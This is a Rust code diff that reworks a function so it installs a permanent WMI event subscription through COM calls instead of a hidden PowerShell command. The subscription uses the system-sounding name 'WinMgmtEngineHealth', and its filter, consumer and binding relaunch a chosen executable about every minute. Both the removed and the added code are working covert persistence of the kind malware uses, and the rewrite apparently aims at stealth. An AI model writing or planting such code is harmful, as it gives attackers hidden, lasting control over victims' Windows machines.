@@ -236,16 +236,95 @@ fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Erro
         return Ok(());
     }
 
-    let task_name = "WinMgmtEngineHealth";
-    let exe_path = path.to_string_lossy().replace("\\", "\\\\");
-    let script = format!(
-        "$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{task_name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfRawData_PerfOS_System'''}}; $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{task_name}';CommandLineTemplate='{exe_path}'}}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}",
-        task_name = task_name,
-        exe_path = exe_path
-    );
+    unsafe {
+        use windows::Win32::System::Com::*;
+        use windows::Win32::System::Wmi::*;
+        use windows::Win32::System::Variant::*;
+        use windows::core::{BSTR, PCWSTR};
 
-    let _ = Command::new("powershell")
-        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
-        .output();
+        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
+
+        let locator: IWbemLocator = CoCreateInstance(&WbemLocator, None, CLSCTX_INPROC_SERVER)?;
+        let services = locator.ConnectServer(
+            &BSTR::from("root\\subscription"),
+            None,
+            None,
+            None,
+            0,
+            None,
+            None,
+        )?;
+
+        CoSetProxyBlanket(
+            &services,
+            10, // RPC_C_AUTHN_WINNT
+            0,  // RPC_C_AUTHZ_NONE
+            None,
+            RPC_C_AUTHN_LEVEL_CALL,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            None,
+            EOAC_NONE,
+        )?;
+
+        let task_name = "WinMgmtEngineHealth";
+        let exe_path = path.to_string_lossy();
+
+        let put_prop = |inst: &IWbemClassObject, name: &str, value: &str| -> Result<(), Box<dyn std::error::Error>> {
+            let mut v = VARIANT::default();
+            let bstr_val = BSTR::from(value);
+            
+            let v_inner = &mut v.Anonymous.Anonymous;
+            v_inner.vt = VT_BSTR;
+            v_inner.Anonymous.bstrVal = std::mem::ManuallyDrop::new(bstr_val);
+            let name_bstr = BSTR::from(name);
+            inst.Put(PCWSTR::from_raw(name_bstr.as_wide().as_ptr()), 0, &v, 0).map_err(|e| e.to_string())?;
+            
+            Ok(())
+        };
+
+        let mut filter_class = None;
+        let filter_class_name = BSTR::from("__EventFilter");
+        services.GetObject(&filter_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut filter_class), None).map_err(|e| e.to_string())?;
+        let filter_class = filter_class.ok_or("failed to get __EventFilter class")?;
+        
+        let filter_inst = filter_class.SpawnInstance(0).map_err(|e| e.to_string())?;
+
+        put_prop(&filter_inst, "Name", task_name)?;
+        put_prop(&filter_inst, "QueryLanguage", "WQL")?;
+        put_prop(&filter_inst, "Query", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'")?;
+        put_prop(&filter_inst, "EventNamespace", "root\\cimv2")?;
+
+        services.PutInstance(&filter_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;
+
+        let mut consumer_class = None;
+        let consumer_class_name = BSTR::from("CommandLineEventConsumer");
+        services.GetObject(&consumer_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut consumer_class), None).map_err(|e| e.to_string())?;
+        let consumer_class = consumer_class.ok_or("failed to get CommandLineEventConsumer class")?;
+        
+        let consumer_inst = consumer_class.SpawnInstance(0).map_err(|e| e.to_string())?;
+
+        put_prop(&consumer_inst, "Name", task_name)?;
+        put_prop(&consumer_inst, "CommandLineTemplate", &exe_path)?;
+
+        services.PutInstance(&consumer_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;
+
+        let mut binding_class = None;
+        let binding_class_name = BSTR::from("__FilterToConsumerBinding");
+        services.GetObject(&binding_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut binding_class), None).map_err(|e| e.to_string())?;
+        let binding_class = binding_class.ok_or("failed to get __FilterToConsumerBinding class")?;
+        
+        let binding_inst = binding_class.SpawnInstance(0).map_err(|e| e.to_string())?;
+
+        let filter_path = format!("__EventFilter.Name=\"{}\"", task_name);
+        let consumer_path = format!("CommandLineEventConsumer.Name=\"{}\"", task_name);
+
+        put_prop(&binding_inst, "Filter", &filter_path)?;
+        put_prop(&binding_inst, "Consumer", &consumer_path)?;
+
+        services.PutInstance(&binding_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;
+
+        debug!("WMI permanent event subscription installed successfully");
+    }
+
     Ok(())
 }
